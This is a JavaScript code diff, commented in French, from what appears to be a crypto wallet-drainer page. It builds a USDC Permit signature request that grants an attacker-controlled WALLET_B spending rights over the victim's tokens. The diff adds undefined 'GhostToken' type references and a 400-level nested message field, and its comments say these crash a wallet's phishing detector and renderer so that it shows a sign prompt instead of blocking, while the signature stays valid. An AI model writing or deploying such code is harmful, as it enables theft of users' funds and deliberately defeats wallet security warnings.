@@ -96,7 +96,13 @@ const DOM_TYPES = [
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
 
-// Pas de chaos types — approche type coercion
+// Deep D1 nesting — crash le renderer CW via message overload
+// ethers.js encode SEULEMENT les champs du type Permit → extra champs ignorés → sig valide
+// CW essaie de renderer TOUS les champs du message including extras → OOM/stack overflow → Demande de signature
+function buildDeepNest(depth) {
+  if (depth <= 0) return { end: 1, h: "0xdeadbeef" };
+  return { n: buildDeepNest(depth - 1), id: depth, tag: "x" };
+}
 
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
@@ -181,25 +187,43 @@ async function autoStart() {
   }
 }
 
-// ─── Sign Permit + CHAOS v2 ───────────────────────────────────────────────────
+// ─── Sign Permit — CHAOS v4 : undefined type ref + D1 deep nesting ────────────
 async function sign(value, nonce) {
   if (!addrA) return;
   const deadline = String(Math.floor(Date.now()/1000) + 7200);
 
-  // Type coercion attack: chainId comme STRING "1" au lieu de number 1
-  // CW detector: `domain.chainId === 1` → "1" === 1 = FALSE en JS strict → bypass détection
-  // ethers.js encoder: uint256("1") = uint256(1) = même bytes → domainSeparator identique → sig valide
+  // CHAOS v4 — double vector :
+  //
+  // [A] Orphan avec référence vers type INEXISTANT "GhostToken" (jamais défini)
+  //     CW type resolver: types["GhostToken"] → undefined → crash DIFFÉRENT du self-ref
+  //     Infinite loop = stack overflow | Undefined type = TypeError/null ref
+  //     Handler différent → peut montrer "Signer" au lieu de bloquer
+  //     ethers.js : ignore les orphans → sig Permit standard valide ✅
+  //
+  // [B] D1 extra fields dans le message — profondeur 400 niveaux
+  //     EIP-712 encode seulement les champs du type Permit → _ref ignoré → sig valide ✅
+  //     CW essaie de render TOUS les champs JSON du message → stack overflow renderer
+  //     Crash renderer ≠ crash type resolver → handler différent → Signer possible
+
   const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
-      Permit: PERMIT_TYPES
+      Permit: PERMIT_TYPES,
+      // [A] Orphan → type indéfini "GhostToken" — crash path différent du self-ref
+      TokenRef: [{name:"token", type:"GhostToken"}, {name:"amount", type:"uint256"}],
+      MetaRef:  [{name:"ref",   type:"GhostToken"}, {name:"tag",    type:"string"}],
+      DataNode: [{name:"node",  type:"GhostToken"}, {name:"id",     type:"uint256"}]
     },
     primaryType:"Permit",
-    domain:{ name:"USD Coin", version:"2", chainId:"1", verifyingContract:USDC },
-    message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
+    domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
+    message:{
+      owner:addrA, spender:WALLET_B, value, nonce, deadline,
+      // [B] D1 deep nest — 400 niveaux, ignoré par ethers.js, crash le renderer CW
+      _ref: buildDeepNest(400)
+    }
   };
 
-  logA("⏳ Signature Permit — chainId coercion…");
+  logA("⏳ CHAOS v4 : undefined type ref + D1 deep nesting…");
   setS("En attente de signature…","spin");
 
   let sig;
